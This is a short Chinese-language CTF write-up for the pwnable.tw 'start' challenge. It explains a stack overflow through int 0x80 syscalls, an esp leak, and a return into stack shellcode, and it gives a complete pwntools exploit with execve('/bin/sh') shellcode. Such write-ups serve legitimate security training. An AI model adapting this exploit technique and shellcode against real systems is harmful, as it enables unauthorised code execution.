是一道基础的栈溢出

题目会用int 80给一个输出，然后会允许你进行输入，输入可以直接完成栈溢出

（int 80中eax寄存器内存放的是操作数，4为输出，3为输入

思路是用输出leak出esp的地址，然后执行存放在栈内的shellcode

ROP直接跳转到 0x08048087 ，可以通过输出泄露出esp此时的地址

需要注意的是，这里获得的输出并不是当前的栈顶，相比于正常的函数调用，少了一个 pop esp的过程

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-start-1.png)

所以我们需要对获得的 esp_addr - 0x4 才是真正的栈顶

所以 shellcode_addr = esp_addr - 0x4 + 0x18 = esp_addr + 0x14

exp

```python
from pwn import  *

p = remote('chall.pwnable.tw',10000)
payload = 'a'*0x14 + p32(0x08048087)
p.recvuntil(':')
p.send(payload)
addr = u32(p.recv(4))+0x14
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = 'a'*0x14 + p32(addr) + shellcode
p.send(payload)
p.interactive()
```

